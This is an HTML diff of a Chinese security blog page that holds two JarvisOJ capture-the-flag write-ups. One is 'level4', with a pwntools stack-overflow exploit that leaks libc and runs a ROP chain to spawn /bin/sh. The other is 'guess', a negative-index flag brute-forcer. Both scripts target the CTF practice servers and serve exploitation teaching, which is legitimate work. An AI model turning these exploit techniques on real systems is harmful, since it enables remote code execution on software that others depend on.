@@ -108,29 +108,23 @@
 
 
 
-  <meta name="description" content="jarvis-&amp;gt;level4代码逻辑程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出  查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。  调试整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和’/bin/sh’的地址即可，但是在调试过程中发现程序中并没有现">
-<meta property="og:type" content="article">
-<meta property="og:title" content="jarvisOj-level4">
-<meta property="og:url" content="http://yoursite.com/2018/11/25/jarvisOj-level4/index.html">
+  <meta name="description" content="Talking is cheap, show me the code.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Ama2in9">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="Ama2in9">
-<meta property="og:description" content="jarvis-&amp;gt;level4代码逻辑程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出  查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。  调试整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和’/bin/sh’的地址即可，但是在调试过程中发现程序中并没有现">
+<meta property="og:description" content="Talking is cheap, show me the code.">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/11/25/jarvisOj-level4/1.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/11/25/jarvisOj-level4/2.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/11/25/jarvisOj-level4/3.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/11/25/jarvisOj-level4/4.jpg">
-<meta property="og:updated_time" content="2018-11-25T08:42:46.736Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="jarvisOj-level4">
-<meta name="twitter:description" content="jarvis-&amp;gt;level4代码逻辑程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出  查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。  调试整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和’/bin/sh’的地址即可，但是在调试过程中发现程序中并没有现">
-<meta name="twitter:image" content="http://yoursite.com/2018/11/25/jarvisOj-level4/1.jpg">
+<meta name="twitter:title" content="Ama2in9">
+<meta name="twitter:description" content="Talking is cheap, show me the code.">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/25/jarvisOj-level4/"/>
+  <link rel="canonical" href="http://yoursite.com/page/2/"/>
 
 
 
@@ -140,7 +134,7 @@
   };
 </script>
 
-  <title>jarvisOj-level4 | Ama2in9</title>
+  <title>Ama2in9</title>
   
 
 
@@ -187,7 +181,8 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -292,9 +287,9 @@
           
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
 
   
 
@@ -326,7 +321,11 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">jarvisOj-level4
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/25/jarvisOj-level4/" itemprop="url">
+                  jarvisOj-level4
+                </a>
               
             
           </h1>
@@ -426,7 +425,9 @@
       
 
       
-        <h1 id="jarvis-gt-level4"><a href="#jarvis-gt-level4" class="headerlink" title="jarvis-&gt;level4"></a>jarvis-&gt;level4</h1><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出</p>
+        
+          
+            <h1 id="jarvis-gt-level4"><a href="#jarvis-gt-level4" class="headerlink" title="jarvis-&gt;level4"></a>jarvis-&gt;level4</h1><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出</p>
 <p><img src="/2018/11/25/jarvisOj-level4/1.jpg" alt="code"><br><img src="/2018/11/25/jarvisOj-level4/2.jpg" alt="code2"></p>
 <p>查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。</p>
 <p><img src="/2018/11/25/jarvisOj-level4/3.jpg" alt="protection"></p>
@@ -436,6 +437,8 @@
 <p>代码里的leak函数是使用一种持续化泄露函数地址的方式讲指定的address输出出来，借此找到libc,后面的payload是使用read从用户输入中获取’/bin/sh’，之后三个pop将栈里的read三个参数都弹出栈，到ret的时候esp就是system_addr，它的参数是bss段的地址(可以用IDA查看)</p>
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"info"</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    padding = <span class="string">'A'</span> * <span class="number">0x8c</span></span><br><span class="line">    write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">    vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">    payload = padding + p32(write_plt) + p32(vulnearbale_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ret = <span class="number">0x08048509</span></span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">0x8C</span></span><br><span class="line">vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">payload = padding + p32(read_plt) + p32(pop_ret) +p32(<span class="number">0</span>) + p32(bss_addr)\</span><br><span class="line">        + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulnearbale_addr) +p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
+          
+        
       
     </div>
 
@@ -455,32 +458,12 @@
       
 
       
-      
+
       
 
       
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/11/25/jarvisOj_guess/" rel="next" title="javisOj->Guess">
-                <i class="fa fa-chevron-left"></i> javisOj->Guess
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/25/dubblesort/" rel="prev" title="dubblesort">
-                dubblesort <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
       
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -490,25 +473,204 @@
   </article>
 
 
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/jarvisOj_guess/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Talking is cheap, show me the code.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/25/jarvisOj_guess/" itemprop="url">
+                  javisOj->Guess
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-11-25 16:38:24" itemprop="dateCreated datePublished" datetime="2018-11-25T16:38:24+08:00">2018-11-25</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/jarvisOj/" itemprop="url" rel="index"><span itemprop="name">jarvisOj</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/11/25/jarvisOj_guess/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/11/25/jarvisOj_guess/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/11/25/jarvisOj_guess/" class="leancloud_visitors" data-flag-title="javisOj->Guess">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="jarvis-gt-guess"><a href="#jarvis-gt-guess" class="headerlink" title="jarvis-&gt;guess"></a>jarvis-&gt;guess</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末摸鱼，看做出来的人数以为好做，结果GG，感觉这个题有点像以前看过的一道crypto，总结一下好了</p>
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>下载下来的文件是用来本地测试的，开了socket，监听9999端口，其实就是模拟服务器跑的程序，所以本地通信建一个socket就好。重点是is_flag_correct()函数，是一个验证用户输入的函数，所以这个看起来更像一个逆向题。</p>
+<p>调用这个函数前有一个fgets(inbuf,0x1000,stdin)，如果长度这么长，那么在flag_hexa = flag_hex的时候构造一个100*’A’+’\x00’即可绕过长度检查，造成溢出，不过这个测试之后发现好像没什么用，fuzz没什么异常，继续看函数，里面check flag是通过跟一个预存在栈上的flag数组对比确定的，但是是通过bin_by_hex这个数组做了一次映射确定，而这个数组初始化又是由0x401100LL地址上的数据完成的，有趣的是这个数组的0x30处正是0，其ascii码也是0x30，同理A-F的ascii码对应其数组的索引。因此这个比较只需要用户按顺序输入flag即可，这个比较当然不如直接让用户输入和flag对比来的快，所以这里面一定有什么设计。</p>
+<p><img src="/2018/11/25/jarvisOj_guess/1.jpg" alt="code"><br><img src="/2018/11/25/jarvisOj_guess/2.jpg" alt="code2"><br><img src="/2018/11/25/jarvisOj_guess/3.jpg" alt="bin_by_hex"></p>
+<h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><p>漏洞就出现在数组索引的检查，数组其实就是一个字符串指针，array[i]等同于*(array+i)，所以当i为负数时，其得到的数据是字符串指针低地址处的数据，这里的flag位置是ebp-0x150，bin_hex_index的位置在ebp-0x110，因此bin_hex_index[-0x40]即flag[0]，想要验证成功，只需value1 = 0,value2 = flag[i]。flag[i] = bin_hex_index[-0x40+i]，即用户输入chr(-0x40+i)，但是注意chr()范围是0-256，因此-0x40+i需要+0x100(模100类似格式化字符串以前的知识)，最终构造出一个完美验证通过的payload。<br>仅仅通过验证不是目的，我们还得知道真正的flag是什么，这里因为我们已经通过payload通过了验证，那么现在只需要修改Payload的第一、二字节，使其为ascii(20-127)，重复验证，一旦得到通过即可确定第一个字节，后面的也同理，两个字节两个字节的确定，直到所有payload都被替换成真正的flag</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"error"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'guess&gt; '</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    response = sh.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Nope.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">init_payload = <span class="string">''</span></span><br><span class="line">offset = <span class="number">0x100</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        init_payload += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        init_payload += chr(offset + (i<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> len(init_payload)</span><br><span class="line"><span class="comment">#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">            temp = hex(j)[<span class="number">2</span>:]</span><br><span class="line">            init_payload = init_payload[:i] + temp.ljust(<span class="number">2</span>,<span class="string">'0'</span>) + init_payload[i+<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> guess(init_payload) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> str(i)+<span class="string">':'</span>+init_payload</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> init_payload</span><br><span class="line">flag = init_payload.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>中间recv会报timeout，可以修改for循环start，断点验证，之后hex_encode即可</p>
+<h2 id="编外"><a href="#编外" class="headerlink" title="编外"></a>编外</h2><p>看别人的wp有说patch改掉alarm然后方便调试的，这里也记录一下吧，虽然自己没调试</p>
+<p>找到call _alarm位置，option-&gt;general,number of opcode bytes改为8<br>选中mov edi,78h call _alarm,打开Edit-&gt;Patch Program-&gt;change bytes<br>最后Edit-&gt;Patch Program-&gt;Apply patches to input file</p>
+<p><img src="/2018/11/25/jarvisOj_guess/5.jpg" alt="patch"><br><img src="/2018/11/25/jarvisOj_guess/6.jpg" alt="res"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
   </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
 
 
           </div>
           
-
-  
-    <div class="comments" id="comments">
-      <div id="disqus_thread">
-        <noscript>
-          Please enable JavaScript to view the
-          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
-        </noscript>
-      </div>
-    </div>
-
-  
-
-
 
         </div>
         
@@ -529,17 +691,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -615,22 +768,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#jarvis-gt-level4"><span class="nav-number">1.</span> <span class="nav-text">jarvis-&gt;level4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码逻辑"><span class="nav-number">1.1.</span> <span class="nav-text">代码逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试"><span class="nav-number">1.2.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-py"><span class="nav-number">1.3.</span> <span class="nav-text">exp.py</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -775,10 +912,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
-
-
 
   
 
@@ -793,23 +926,6 @@
     <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
   
 
-  
-    <script type="text/javascript">
-      var disqus_config = function () {
-        this.page.url = 'http://yoursite.com/2018/11/25/jarvisOj-level4/';
-        this.page.identifier = '2018/11/25/jarvisOj-level4/';
-        this.page.title = 'jarvisOj-level4';
-        };
-      function loadComments () {
-        var d = document, s = d.createElement('script');
-        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', '' + +new Date());
-        (d.head || d.body).appendChild(s);
-      }
-      
-        loadComments();
-      
-    </script>
   
 
 
